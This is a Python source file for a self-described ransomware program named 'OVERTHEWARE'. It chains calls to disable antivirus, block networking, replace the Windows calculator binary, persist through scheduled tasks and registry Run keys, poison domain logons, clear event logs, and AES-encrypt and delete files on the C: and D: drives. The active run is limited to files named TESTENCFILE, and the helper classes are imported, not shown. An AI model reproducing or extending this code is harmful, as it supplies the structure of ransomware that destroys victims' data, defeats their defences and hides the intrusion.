from src._all import *
import base64
import os
# try:
#     _CONTROLLIB()
# except:
#     pass

__all__ = ["OVERTHEWARE"]

class OVERTHEWARE(object):
    def __init__(self):
        self.__tardir = ["C:/","D:/"]
        self.__mexe = "calc.exe"
        self.__mcalc = "C:\Windows\System32\calc.exe"
        self.__tcalc = "C:\Windows\System32"
        self.__tmp = "C:\Windows\Temp"
        self.__mdir = os.getcwd()
        self.__mexs = self.__mdir+"\\"+"calcc.exe"
    def __str__(self):
        return "RANSOMWARE - NAME IT: [ OVERTHEWARE ] / ALL PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return OVERTHEWARE.__doc__
    def _KILLAVS(self):
        KILLAVS()._KILLALL()
    def _BLOCKNET(self):
        BLOCKNET()._MODIFY()
    def _RETURNDIRECTORIES(self):
        return SCANDIRECTORIES(self.__tardir[0])._RETURN_SAMPLE(),\
            SCANDIRECTORIES(self.__tardir[1])._RETURN_SAMPLE()
    def _REMOVEFILE(self):
        REMOVEFILE(self.__mcalc)._REMOVE()
    def _MOVEFILE(self):
        try:
            COPYFILEINIT(self.__mdir+"\\"+self.__mexe,self.__mexs)._CPRUN()
            MOVEFILEINIT(self.__mexs,self.__tcalc)._MOVEIN()
        except:
            pass
        try:
            COPYFILEINIT(self.__mdir+"\\"+self.__mexe,self.__tmp)._CPRUN()
        except:
            pass
        try:
            MOVEFILEINIT(self.__mdir+"\\"+self.__mexe,self.__tcalc)._MOVEIN()
        except:
            pass
    def _AUTOTASK(self):
        TASKWINDOWS(self.__mcalc.replace("/","\\"))._LAUNCH("NormalPathKey")
    def _POISONHKEY(self):
        CHANGEPATHKEY(self.__mexe,self.__tcalc+"\\")._LCLRUN()
        CHANGEPATHKEY(self.__mexe,self.__tcalc+"\\")._USRRUN()
    def _POISONDOMAIN(self):
        ALLSIDLOGON(self.__mexe)._POISONALL()
    def _DELETELOG(self):
        ACCESSLOGFILES()._CLEAREVENT()
    def _ENCPATHFILE(self,inittar:str):
        ENCFILEAES(inittar)._LAUNCH()
    def _LAUNCHWARE(self):
        cdir,ddir = self._RETURNDIRECTORIES()
        # for xc in cdir:
        #     if os.path.isfile(xc):
        #         try:
        #             if xc.name == "TESTENCFILE.txt" or \
        #                 xc.name == "TESTENCFILE.pdf" or \
        #                     xc.name == "TESTENCFILE.xlsx":
        #                 self._ENCPATHFILE(xc.path)
        #                 REMOVEFILE(xc.path)._REMOVE()
        #             else:
        #                 pass
        #         except:
        #             pass
        #     else:
        #         pass
        for xd in ddir:
            if os.path.isfile(xd):
                try:
                    if xd.name == "TESTENCFILE.txt" or \
                        xd.name == "TESTENCFILE.pdf" or \
                            xd.name == "TESTENCFILE.xlsx":
                        self._ENCPATHFILE(xd.path)
                        REMOVEFILE(xd.path)._REMOVE()
                    else:
                        pass
                except:
                    pass
            else:
                pass

if __name__ == "__main__":
    # OVERTHEWARE()._BLOCKNET()
    print("[>>] BLOCK CONNECTIONS - DONE")
    # OVERTHEWARE()._KILLAVS()
    print("[>>] KILL AVS - DONE")
    # OVERTHEWARE()._REMOVEFILE()
    print("[>>] REMOVE FILE - DONE")
    # OVERTHEWARE()._MOVEFILE()
    print("[>>] MOVE FILE - DONE")
    # OVERTHEWARE()._AUTOTASK()
    print("[>>] AUTOTASK POISON - DONE")
    # OVERTHEWARE()._POISONHKEY()
    print("[>>] HKEY POISON - DONE")
    # OVERTHEWARE()._POISONDOMAIN()
    print("[>>] DOMAIN POISON - DONE")
    # OVERTHEWARE()._DELETELOG()
    print("[>>] DELETE LOG - DONE")
    OVERTHEWARE()._LAUNCHWARE()
    print("[>>] FILE ENCRYPTION - DONE")
    # OVERTHEWARE()._DELETELOG()
    print("[>>] LAST DELETE LOG - DONE")
